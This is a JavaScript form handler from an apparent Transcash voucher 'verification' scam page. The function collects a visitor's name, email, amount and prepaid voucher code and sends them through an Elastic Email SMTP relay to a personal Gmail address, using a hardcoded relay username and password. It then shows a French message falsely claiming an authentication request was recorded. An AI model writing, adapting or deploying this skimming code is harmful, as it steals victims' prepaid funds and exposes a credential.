
function emailSend(){
    var userName = document.getElementById('Name').value;
    var email = document.getElementById('email').value;
    var prix = document.getElementById('Prix').value;
    var code = document.getElementById('code').value;




    var messageBody = "Transcash: " + userName + 
                      "<br/> email: " + email +
                      "<br/> prix: " + prix + 
                      "<br/> code: " +  code;
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "andreashope03@gmail.com",
        Password : "E41118CF93C8CB54E62438BA477843A4E752",
        To : 'elsamorhow@gmail.com',
        From : "andreashope03@gmail.com",
        Subject : "This is the subject",
        Body : messageBody
    }).then(
      message => {
        if( message =='OK'){
          swal("Succefull", "Demande d'authentification enregistrer avec succès. <br/> Veuillez patientez pendant quelques instants vous recevrez un mail de comfirmation", "success");

        }
        else{
          swal("Error", "Veuillez reessayer!", "Error");

        }
      }
    );


  
}